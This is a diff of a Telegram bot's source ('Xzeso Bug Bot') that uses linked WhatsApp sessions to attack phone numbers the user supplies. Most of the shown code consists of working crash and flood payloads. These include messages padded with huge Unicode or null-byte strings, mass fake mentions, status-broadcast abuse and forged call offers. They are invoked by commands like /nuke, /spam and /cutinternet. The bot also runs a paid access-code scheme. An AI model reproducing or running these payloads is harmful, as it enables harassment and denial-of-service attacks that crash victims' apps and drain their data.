-                        level5: "X".repeat(546),
-                        array_data: Array(100).fill().map(() => ({
-                          item: "Memeks",
-                          details: "X"
-                        }))
-                      }
-                    }
-                  }
-                }),
-                binaryData: "\u0081".repeat(0x1000)
+          stickerMessage: {
+            url: `https://mmg.whatsapp.net/v/t62.7118-24/${crypto.randomBytes(32).toString("hex")}.enc`,
+            mimetype: "image/webp",
+            fileLength: "999999999",
+            height: 99999, width: 99999,
+            mediaKey: crypto.randomBytes(64).toString("base64"),
+            fileEncSha256: crypto.randomBytes(64).toString("base64"),
+            fileSha256: crypto.randomBytes(64).toString("base64"),
+            directPath: "/" + crypto.randomBytes(32).toString("hex"),
+            mediaKeyTimestamp: Date.now().toString(),
+            jpegThumbnail: payload,
+            caption: payload
+          }
+        }
+      }, {});
+      promises.push(client.relayMessage(target, { message: msg.message }, { messageId: msg.key.id }).catch(() => {}));
+      if (i % 200 === 0) await sleep(50);
+    }
+    await Promise.all(promises);
+    log.crash(`HIDDEN STICKERS 10x: 2000 invisible stickers to ${target} 📸`);
+  } catch (err) { log.error(`HIDDEN STICKERS error: ${err.message}`); }
+}
+
+async function attackCutInternet(client, target) {
+  try {
+    // إرسال payloads ضخمة جداً لتعطل الشبكة بالكامل
+    const payload1 = "K".repeat(200000);
+    const payload2 = "\x00".repeat(200000);
+    const promises = [];
+
+    // دفعة 1: viewOnceMessage مع payload ضخم
+    for (let i = 0; i < 50; i++) {
+      const msg = generateWAMessageFromContent(target, {
+        message: {
+          viewOnceMessage: {
+            message: {
+              messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
+              interactiveMessage: {
+                body: { text: payload1 },
+                header: { hasMediaAttachment: false },
+                nativeFlowMessage: { buttons: [], messageParamsJson: payload2 }
               }
             }
           }
         }
-      }
-    }, {});
+      }, { ephemeralExpiration: 0 });
+      promises.push(client.relayMessage(target, { message: msg.message }, { messageId: msg.key.id }).catch(() => {}));
+    }
 
-    await client.relayMessage("status@broadcast", software.message, {
-      messageId: software.key.id,
-      statusJidList: [X],
-      additionalNodes: [{
-        tag: "meta",
-        attrs: {},
-        content: [{
-          tag: "mentioned_users",
-          attrs: {},
-          content: [{
-            tag: "to",
-            attrs: { jid: X },
-            content: undefined
-          }]
-        }]
-      }]
-    });
+    // دفعة 2: conversation messages ضخمة
+    for (let i = 0; i < 50; i++) {
+      const msg = generateWAMessageFromContent(target, {
+        message: { conversation: "🔌 " + "K".repeat(100000) + " Internet Cut Attack " + i }
+      }, {});
+      promises.push(client.relayMessage(target, { message: msg.message }, { messageId: msg.key.id }).catch(() => {}));
+    }
 
-    await sleep(100);
-  } catch (err) {
-    log.error(`delaybeta error: ${err.message}`);
-  }
-}
-
-async function ZenoDrainKuota(client, X, ptcp = true) {
-  try {
-    const VidMessage = generateWAMessageFromContent(X, {
-      videoMessage: {
-        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
-        mimetype: "video/mp4",
-        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
-        fileLength: "289511",
-        seconds: 15,
-        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
-        caption: "\n",
-        height: 640,
-        width: 640,
-        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
-        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
-        mediaKeyTimestamp: "1743848703",
-        contextInfo: {
-          isSampled: true,
-          participant: X,
-          mentionedJid: [
-            ...Array.from({ length: 500 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"),
-          ],
-          remoteJid: "X",
-          forwardingScore: 100,
-          isForwarded: true,
-          stanzaId: "123456789ABCDEF",
-          quotedMessage: {
-            businessMessageForwardInfo: {
-              businessOwnerJid: "0@s.whatsapp.net",
-            },
-          },
-        },
-        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
-        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
-        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
-        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
-      },
-    }, {
-      ephemeralExpiration: 0,
-      forwardingScore: 9741,
-      isForwarded: true,
-    });
-
-    await client.relayMessage(X, {
-      groupStatusMessageV2: {
-        message: VidMessage.message,
-      },
-    }, ptcp ? {
-      messageId: VidMessage.key.id,
-      participant: { jid: X }
-    } : { messageId: VidMessage.key.id });
-
-    await sleep(100);
-  } catch (err) {
-    log.error(`ZenoDrainKuota error: ${err.message}`);
-  }
-}
-// =====================================================================
-// raju.js - Xzeso Bug Bot (Version 4.0 - Full 4500+ Lines)
-// =====================================================================
-// PART 3/7: Lines 1301-1950
-// Total: ~4550 Lines
-// =====================================================================
-
-async function XoipFc(client, X, ptcp = true) {
-  try {
-    let msg = generateWAMessageFromContent(X, {
-      viewOnceMessage: {
+    // دفعة 3: صور ستكر ضخمة
+    for (let i = 0; i < 30; i++) {
+      const msg = generateWAMessageFromContent(target, {
         message: {
-          locationMessage: {
-            degreesLatitude: -9.09999262999,
-            degreesLongitude: 199.9996311899,
-            name: "🧪⃟꙰ 𝗫𝗜𝗡𝗦𝗢𝗢𝗩𝟭𝟮" + "𑇂𑆵𑆴𑆿𑆿".repeat(5000),
-            address: "🧪⃟꙰ 𝗫𝗜𝗡𝗦𝗢𝗢𝗩𝟭𝟮" + "𑇂𑆵𑆴𑆿𑆿".repeat(5000),
-            url: `https://zeno-iosx.${"𑇂𑆵𑆴𑆿".repeat(5000)}.com`,
-            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
-          },
-        },
-      },
-    }, {});
-
-    await client.relayMessage(X, {
-      groupStatusMessageV2: {
-        message: msg.message,
-      },
-    }, ptcp ? {
-      messageId: msg.key.id,
-      participant: { jid: X }
-    } : { messageId: msg.key.id });
-
-    await sleep(100);
-  } catch (err) {
-    log.error(`XoipFc error: ${err.message}`);
-  }
-}
-
-async function XoipCrash(client, X) {
-  try {
-    const LocX = {
-      locationMessage: {
-        degreesLatitude: 11.11,
-        degreesLongitude: -11.11,
-        name: "#Xinsoo" + "𑇂𑆵𑆴𑆿".repeat(5000),
-        url: "https://t.me/adji_pgstu_dev",
-        contextInfo: {
-          stanzaId: "1234567890ABCDEF",
-          participant: "0@s.whatsapp.net",
-          quotedMessage: {
-            callLogMessage: {
-              isVideo: true,
-              callOutcome: "1",
-              durationSecs: "0",
-              callType: "REGULAR",
-              participants: [{
-                jid: "0@s.whatsapp.net",
-                callOutcome: "1",
-              },],
-            },
-          },
-          externalAdReply: {
-            quotedAd: {
-              advertiserName: "X",
-              mediaType: "IMAGE",
-              jpegThumbnail: "/9j/4AAQSkZAQABAAD/",
-              caption: "𑇂𑆵𑆴𑆿".repeat(5000),
-            },
-            placeholderKey: {
-              remoteJid: "0s.whatsapp.net",
-              fromMe: false,
-              id: "CrashIosInvisible",
-            },
-          },
-        },
-      },
-    };
-
-    await client.relayMessage("status@broadcast", LocX, {
-      messageId: LocX.key?.id || undefined,
-      statusJidList: [X],
-      additionalNodes: [{
-        tag: "meta",
-        attrs: {},
-        content: [{
-          tag: "mentioned_users",
-          attrs: {},
-          content: [{
-            tag: "to",
-            attrs: { jid: X },
-          },],
-        },],
-      },],
-    });
-
-    await sleep(100);
-  } catch (err) {
-    log.error(`XoipCrash error: ${err.message}`);
-  }
-}
-
-async function Occolot(client, X) {
-  try {
-    const msg = generateWAMessageFromContent(
-      X,
-      {
-        interactiveResponseMessage: {
-          contextInfo: {
-            mentionedJid: Array.from(
-              { length: 500 },
-              (_, y) => `1313555000${y + 1}@s.whatsapp.net`
-            )
-          },
-          body: {
-            text: "— ϟ ˙",
-            format: "DEFAULT"
-          },
-          nativeFlowResponseMessage: {
-            name: "address_message",
-            paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"X\",\"address\":\"Yd7\",\"tower_number\":\"Y7d\",\"city\":\"medan\",\"name\":\"xxx\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"D | ${"\u0000".repeat(100000)}\"}}`,
-            version: 3
+          stickerMessage: {
+            url: `https://mmg.whatsapp.net/v/t62.7118-24/${crypto.randomBytes(32).toString("hex")}.enc`,
+            mimetype: "image/webp",
+            fileLength: "999999999",
+            height: 99999, width: 99999,
+            mediaKey: crypto.randomBytes(32).toString("base64"),
+            fileEncSha256: crypto.randomBytes(32).toString("base64"),
+            fileSha256: crypto.randomBytes(32).toString("base64")
           }
         }
-      },
-      { userJid: X }
-    );
+      }, {});
+      promises.push(client.relayMessage(target, { message: msg.message }, { messageId: msg.key.id }).catch(() => {}));
+    }
 
-    await client.relayMessage(
-      "status@broadcast",
-      msg.message,
-      {
-        messageId: msg.key.id,
-        statusJidList: [X, "13135550002@s.whatsapp.net"],
-        additionalNodes: [{
-          tag: "meta",
-          attrs: {},
-          content: [{
-            tag: "mentioned_users",
-            attrs: {},
-            content: [{
-              tag: "to",
-              attrs: { jid: X },
-              content: undefined
-            }]
-          }]
-        }]
-      }
-    );
-
-    await sleep(100);
-  } catch (err) {
-    log.error(`Occolot error: ${err.message}`);
-  }
+    await Promise.all(promises);
+    log.crash(`CUT INTERNET 10x: 130+ packets to ${target} 🔌`);
+  } catch (err) { log.error(`CUT INTERNET error: ${err.message}`); }
 }
 
-async function autosync(client, X) {
+// =====================================================================
+// COMMAND: /invisisendx (Invisible Send - Invisible Messages)
+// =====================================================================
+
+async function attackInvisisendx(client, target) {
   try {
-    let devices = (
-      await client.getUSyncDevices([X], false, false)
-    ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);
+    // 1000 رسالة غير مرئية مع viewOnceMessage و ephemeral messages
+    const payload = "🔒".repeat(50000);
+    const promises = [];
+    const batchSize = 100;
 
-    await client.assertSessions(devices);
-
-    let createMutex = () => {
-      let map = {};
-      return {
-        mutex(key, fn) {
-          map[key] ??= { task: Promise.resolve() };
-          map[key].task = (async prev => {
-            try { await prev; } catch {}
-            return fn();
-          })(map[key].task);
-          return map[key].task;
-        }
-      };
-    };
-
-    let mutexManager = createMutex();
-    let mergeBuffer = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
-    let originalCreateParticipantNodes = client.createParticipantNodes.bind(client);
-    let encodeMsg = client.encodeWAMessage?.bind(client);
-
-    client.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
-      if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };
-
-      let patched = await (client.patchMessageBeforeSending?.(message, recipientJids) ?? message);
-      let mapped = Array.isArray(patched) ? patched : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));
-
-      let { id: meId, lid: meLid } = client.authState.creds.me;
-      let decodedLidUser = meLid ? jidDecode(meLid)?.user : null;
-      let shouldIncludeDeviceIdentity = false;
-
-      let nodes = await Promise.all(mapped.map(async ({ recipientJid: jid, message: msg }) => {
-        let { user: targetUser } = jidDecode(jid);
-        let { user: ownPnUser } = jidDecode(meId);
-        let isOwnUser = targetUser === ownPnUser || targetUser === decodedLidUser;
-        let isSelf = jid === meId || jid === meLid;
-
-        if (dsmMessage && isOwnUser && !isSelf) msg = dsmMessage;
-
-        let bytes = mergeBuffer(encodeMsg ? encodeMsg(msg) : encodeWAMessage(msg));
-
-        return mutexManager.mutex(jid, async () => {
-          let { type, ciphertext } = await client.signalRepository.encryptMessage({ jid, data: bytes });
-          if (type === 'pkmsg') shouldIncludeDeviceIdentity = true;
-          return {
-            tag: 'to',
-            attrs: { jid },
-            content: [{ tag: 'enc', attrs: { v: '2', type, ...extraAttrs }, content: ciphertext }]
-          };
-        });
-      }));
-
-      return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
-    };
-
-    let { nodes: destinations, shouldIncludeDeviceIdentity } =
-      await client.createParticipantNodes(devices, { conversation: "y" }, { count: '0' });
-
-    let callNode = {
-      tag: "call",
-      attrs: { to: X, id: client.generateMessageTag(), from: client.user.id },
-      content: [{
-        tag: "offer",
-        attrs: {
-          "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
-          "call-creator": client.user.id
-        },
-        content: [
-          { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
-          { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
-          {
-            tag: "video",
-            attrs: {
-              orientation: "0",
-              screen_width: "1920",
-              screen_height: "1080",
-              device_orientation: "0",
-              enc: "vp8",
-              dec: "vp8"
+    for (let batch = 0; batch < 10; batch++) {
+      const batchPromises = [];
+      for (let i = 0; i < batchSize; i++) {
+        const msg = generateWAMessageFromContent(target, {
+          message: {
+            viewOnceMessage: {
+              message: {
+                messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
+                interactiveMessage: {
+                  body: { text: payload + ` INVISIBLE ${batch * batchSize + i}` },
+                  header: { hasMediaAttachment: true },
+                  carouselMessage: { cards: Array(50).fill({ body: { text: " ".repeat(20000) }, nativeFlowMessage: { buttons: [] } }) }
+                }
+              }
             }
-          },
-          { tag: "net", attrs: { medium: "3" } },
-          { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
-          { tag: "encopt", attrs: { keygen: "2" } },
-          { tag: "destination", attrs: {}, content: destinations },
-          ...(shouldIncludeDeviceIdentity ? [{
-            tag: "device-identity",
-            attrs: {},
-            content: encodeSignedDeviceIdentity(client.authState.creds.account, true)
-          }] : [])
-        ]
-      }]
-    };
-
-    await client.sendNode(callNode);
-    await sleep(50);
-  } catch (err) {
-    log.error(`autosync error: ${err.message}`);
-  }
-}
-
-async function BuldozerCombine(client, X, ptcp = true) {
-  try {
-    const VariabelJid = "0@s.whatsapp.net";
-    const imageMsg = {
-      url: "https://mmg.whatsapp.net/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0&mms3=true",
-      mimetype: "image/jpeg",
-      fileSha256: "QpvbDu5HkmeGRODHFeLP7VPj+PyKas/YTiPNrMvNPh4=",
-      fileLength: "99999999",
-      height: 9999,
-      width: 9999,
-      mediaKey: "exRiyojirmqMk21e+xH1SLlfZzETnzKUH6GwxAAYu/8=",
-      fileEncSha256: "D0LXIMWZ0qD/NmWxPMl9tphAlzdpVG/A3JxMHvEsySk=",
-      directPath: "/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0",
-      mediaKeyTimestamp: "1755254367",
-      jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyy4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAEBAQEBAQAAAAAAAAAAAAAAAQIDBAYBAQEBAQAAAAAAAAAAAAAAAAEAAgP/2gAMAwEAAhADEAAAAPnZTmbzuox0TmBCtSqZ3yncZNbamucUMszSBoWtXBzoUxZNO2enF6Mm+Ms1xoSaKmjOwnIcQJ//xAAhEAACAQQCAgMAAAAAAAAAAAABEQACEBIgETHERQSJAYf/aAAgBAQABPwC6xDlPJlVPvYTyeoKlGxsIavk4F3Hzsl3YJWWjQhOgKjdyfpiYUzCkmCgF/kOvUzMzMzOn/8QAGhEBAAIDAQAAAAAAAAAAAAAAAREgABASMP/aAAgBAgEBPwCz5LGdFYN//8QAHBEAAgICAwAAAAAAAAAAAAAAAREgABASMP/aAAgBAwEBPwCz5LGdFYN//9k=",
-      caption: "\u0000".repeat(50000),
-    };
-
-    let msg = generateWAMessageFromContent(X, {
-      viewOnceMessage: {
-        message: {
-          albumMessage: {
-            expectedImageCount: 666,
-            expectedVideoCount: 0,
-            items: [{ imageMessage: imageMsg }],
-            contextInfo: {
-              mentionedJid: [
-                "13135550002@s.whatsapp.net",
-                ...Array.from({ length: 500 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
-              ],
-              participant: "0@s.whatsapp.net",
-              remoteJid: "status@broadcast",
-              stanzaId: "1234567890ABCDEF",
-              businessMessageForwardInfo: {
-                businessOwnerJid: VariabelJid,
-              },
-            },
-          },
-        },
-      },
-    }, {});
-
-    await client.relayMessage(X, {
-      groupStatusMessageV2: {
-        message: msg.message,
-      },
-    }, ptcp ? {
-      messageId: msg.key.id,
-      participant: { jid: X }
-    } : { messageId: msg.key.id });
-
-    await sleep(100);
-  } catch (err) {
-    log.error(`BuldozerCombine error: ${err.message}`);
-  }
+          }
+        }, { ephemeralExpiration: 86400 });
+        batchPromises.push(client.relayMessage(target, { message: msg.message }, { messageId: msg.key.id }).catch(() => {}));
+      }
+      promises.push(Promise.all(batchPromises));
+      await sleep(80);
+    }
+    await Promise.all(promises);
+    log.crash(`INVISIBLE SEND 10x: 1000 invisible messages to ${target} 🔒`);
+  } catch (err) { log.error(`INVISIBLE SEND error: ${err.message}`); }
 }
 
 // =====================================================================
-// TELEGRAM BOT - COMMANDS
+// Bot Profile Image Management
 // =====================================================================
 
-const bot = new Bot(config.telegramBotToken || "YOUR_BOT_TOKEN");
+function setBotImageUrl(url) {
+  settingsDb.botImage = url;
+  safeWriteJSON("./database/settings.json", settingsDb);
+  return { success: true };
+}
+
+function getBotImageUrl() {
+  return settingsDb.botImage || config.thumburl || "https://i.imgur.com/9Jk5Q2L.jpg";
+}
+
+function getPhotoOptions(caption, keyboard) {
+  const url = getBotImageUrl();
+  return {
+    caption,
+    parse_mode: "HTML",
+    reply_markup: keyboard
+  };
+}
 
 // =====================================================================
 // Middleware: Error Handling
 // =====================================================================
 
 bot.use(async (ctx, next) => {
-  try {
-    await next();
-  } catch (err) {
+  try { await next(); } catch (err) {
     log.error(`Middleware error: ${err.message}`);
-    try {
-      await bot.api.sendMessage(config.ownerId || "123456789", `An error occurred: ${err.message}`);
-    } catch {}
+    try { await bot.api.sendMessage(config.ownerId || "6707747395", `🔥 خطأ: ${err.message}`, { parse_mode: "Markdown" }); } catch {}
   }
 });
 
@@ -1816,34 +763,17 @@ bot.use(async (ctx, next) => {
 bot.use(async (ctx, next) => {
   try {
     if (ctx.chat?.type === "private") {
-      const userPath = path.join("database", "users.json");
-      let users = safeReadJSON(userPath, []);
       const id = ctx.from.id.toString();
-      const username = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name || "Unknown";
-
-      if (!users.includes(id)) {
-        users.push(id);
-        safeWriteJSON(userPath, users);
-        log.user(`New user registered: ${id} (${username})`);
-        try {
-          await bot.api.sendDocument(config.ownerId || "123456789", new InputFile(userPath), {
-            caption: `👤 *New User Registered!*\n\n🆔 ID: \`${id}\`\n💬 Username: ${username}\n📅 Time: ${new Date().toLocaleString()}`,
-            parse_mode: "Markdown",
-          });
-        } catch {}
+      if (!usersDb.includes(id)) {
+        usersDb.push(id);
+        safeWriteJSON("./database/users.json", usersDb);
+        log.user(`New user: ${id}`);
+        try { await bot.api.sendMessage(config.ownerId || "6707747395", `👤 مستخدم جديد: ${id}`); } catch {}
       }
     }
     await next();
-  } catch (err) {
-    log.error(`Register middleware error: ${err.message}`);
-  }
+  } catch {}
 });
-
-// =====================================================================
-// Middleware: Mandatory Join Check - REMOVED (no longer forced)
-// =====================================================================
-// The following middleware has been removed to eliminate mandatory join checks.
-// Users are not required to join any channel or group to use the bot.
 
 // =====================================================================
 // COMMAND: /start
@@ -1853,120 +783,701 @@ bot.command("start", async (ctx) => {
   try {
     const username = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name;
     const uptime = formatUptime(process.uptime());
-    const usedMemory = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2);
+    const memUsed = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(1);
 
     const caption = `<blockquote>
-<b><i>{❓} Xzeso bot bug say hello ${username}</i></b>
+<b>👋 أهلاً بك يا ${username}!</b>
 
-<b>「 Xzeso Vip Bug V1 ⚡ 」</b>
-••► Dev: @I8_ZU
-••► Run Time: ${uptime}
-••► Memory: ${usedMemory}
-••► InterFace: Button Type
-••► Type: ( Plugin )
+━━━━━━━━━━━━━━━━━━━━━━━
+🔥 <b>Xzeso Bug Bot V6.0</b>
+━━━━━━━━━━━━━━━━━━━━━━━
 
-📢 <b>Stay Connected</b>
-Join our [Telegram Channel](https://t.me/${CHANNEL_ID.replace("@", "")}) for updates.
+⏱️ التشغيل: ${uptime}
+💾 الذاكرة: ${memUsed} MB
+👥 المستخدمين: ${usersDb.length}
+📱 الجلسات: ${Object.keys(waClients).length}
 
-<b>📞 Support</b>
-Contact @I8_ZU for assistance
-</blockquote>`.trim();
+━━━━━━━━━━━━━━━━━━━━━━━
+📢 اختر من القائمة أدناه:
+━━━━━━━━━━━━━━━━━━━━━━━
+</blockquote>`;
 
-    const keyboard = new InlineKeyboard()
-      .text("MENU BUG", "open_allmenu")
-      .text("OWNER BUG", "open_allaccess")
-      .row()
-      .url("CHANNEL", `https://t.me/${CHANNEL_ID.replace("@", "")}`);
-
-    const imageMenu = config.thumburl || "https://i.imgur.com/default.jpg";
-
-    await ctx.replyWithPhoto(imageMenu, {
-      caption,
-      parse_mode: "HTML",
-      reply_markup: keyboard,
-    });
-
-    log.success(`Start command executed for ${username}`);
+     await ctx.reply(caption, {
+       parse_mode: "HTML", reply_markup: getMainMenuKeyboard()
+     });
   } catch (err) {
-    log.error(`Start command error: ${err.message}`);
-    await ctx.reply("❌ An error occurred. Please try again later.");
+    log.error(`Start error: ${err.message}`);
+    try { await ctx.reply("❌ حدث خطأ. حاول مرة أخرى."); } catch {}
   }
 });
 
 // =====================================================================
-// COMMAND: /reqpair
+// COMMAND: /help
 // =====================================================================
 
-bot.command("reqpair", async (ctx) => {
+bot.command("help", async (ctx) => {
+  const helpText = `<blockquote>
+<b>📖 قائمة الأوامر - النسخة العربية</b>
+
+━━━━━━━━━━━━━━━━━━━━━━━
+🔥 <b>أوامر الهجوم:</b>
+/nuke <الرقم> - هجوم نووي (500 رسالة 💥)
+/spam <الرقم> - سبام (2000 رسالة 📨)
+/call <الرقم> - قرصنة صوتية (500 مكالمة 📞)
+/media <الرقم> - فيضان صور (1000 ستكر 🖼️)
+/sticker <الرقم> - ستكرات مخفية (2000 📸)
+/cutinternet <الرقم> - قطع الإنترنت (130+ حزمة 🔌)
+/invisisendx <الرقم> - رسائل غير مرئية (1000 🔒)
+/ghost <الرقم> - هجوم خفي (500 رسالة 👻)
+/mass <رقم1,رقم2> - هجوم متعدد 🎯
+/shield <الرقم> - درع حماية 🛡️
+/stealth <الرقم> - وضع التسلل 🗡️
+━━━━━━━━━━━━━━━━━━━━━━━
+📱 <b>أوامر الجلسات:</b>
+/reqpair <رقم> - ربط واتساب
+/clearsesi - حذف جلسة
+/listpair - عرض الجلسات
+/sessions - إحصائيات الجلسات
+━━━━━━━━━━━━━━━━━━━━━━━
+⚙️ <b>أوامر الإعدادات:</b>
+/setbotpic - تغيير صورة البوت
+/admin - لوحة الأدمن
+/addadmin <id> - إضافة مسؤول
+/deladmin <id> - حذف مسؤول
+/listadmin - قائمة المسؤولين
+/addcmd <اسم> <رد> - أمر مخصص
+/delcmd <اسم> - حذف أمر مخصص
+━━━━━━━━━━━━━━━━━━━━━━━
+🎫 <b>أوامر الاشتراكات:</b>
+/makencode <ساعات> - إنشاء رمز
+/redeem <رمز> - تفعيل رمز
+/listcodes - عرض الرموز
+/delcode <رمز> - حذف رمز
+━━━━━━━━━━━━━━━━━━━━━━━
+🆓 <b>الوضع المجاني:</b>
+/freemode - تفعيل الوضع المجاني
+━━━━━━━━━━━━━━━━━━━━━━━
+🛠️ <b>الصيانة:</b>
+/maintmode - وضع الصيانة
+/maintmsg <رسالة> - رسالة الصيانة
+━━━━━━━━━━━━━━━━━━━━━━━
+👨‍💻 <b>المطور:</b>
+/botinfo - معلومات البوت
+/stats - الإحصائيات
+/ping - اختبار السرعة
+/broadcast <رسالة> - بث رسالة
+━━━━━━━━━━━━━━━━━━━━━━━
+📋 <b>الإدارة:</b>
+/addacces <id> - إضافة صلاحية
+/delacces <id> - حذف صلاحية
+/listacces - عرض الصلاحيات
+/address <id> - إضافة موزع
+/listress - قائمة الموزعين
+━━━━━━━━━━━━━━━━━━━━━━━
+</blockquote>`;
+
+  await ctx.reply(helpText, { parse_mode: "HTML" });
+});
+
+// =====================================================================
+// COMMAND: /nuke (NEW - Command 1)
+// =====================================================================
+
+bot.command("nuke", async (ctx) => {
+  try {
+    const userId = ctx.from.id.toString();
+    if (!hasAccess(userId)) return ctx.reply(getNoAccessMessage());
+
+    const args = ctx.message.text.split(" ");
+    const target = args[1]?.replace(/[^0-9]/g, "");
+    if (!target || target.length < 10) return ctx.reply("⚠️ صيغة خاطئة:\n<code>/nuke 628xxxxxxxx</code>\n\n💥 هجوم نووي - يرسل 50 رسالة متتالية للهدف");
+
+    if (!waClients[userId]?.status === "open") return ctx.reply("📵 واتساب غير متصل! استخدم /reqpair");
+
+    const X = `${target}@s.whatsapp.net`;
+    const imageMenu = getBotImageUrl();
+
+    await ctx.reply(`💥 <b>هجوم نووي جاري...</b>\n🎯 الهدف: <code>${target}</code>\n⏳ انتظر...`, {
+      parse_mode: "HTML"
+    });
+
+    await attackNuke(waClients[userId].sock, X);
+    await ctx.reply(`✅ <b>هجوم نووي مكتمل!</b>\n🎯 ${target} - 50 رسالة`, { parse_mode: "HTML" });
+  } catch (e) {
+    log.error(`NUKE ERROR: ${e.message}`);
+    ctx.reply("❌ خطأ في الهجوم النووي");
+  }
+});
+
+// =====================================================================
+// COMMAND: /shield (NEW - Command 2)
+// =====================================================================
+
+bot.command("shield", async (ctx) => {
   try {
     const userId = ctx.from.id.toString();
     const args = ctx.message.text.split(" ");
-    const phone = args[1]?.replace(/[^0-9]/g, "");
+    const target = args[1]?.replace(/[^0-9]/g, "");
 
-    if (!phone) {
-      return await ctx.reply(
-        "⚠️ *تنسيق خاطئ!*\nمثال:\n`/reqpair 628xxxxxxx`",
-        { parse_mode: "Markdown" }
-      );
-    }
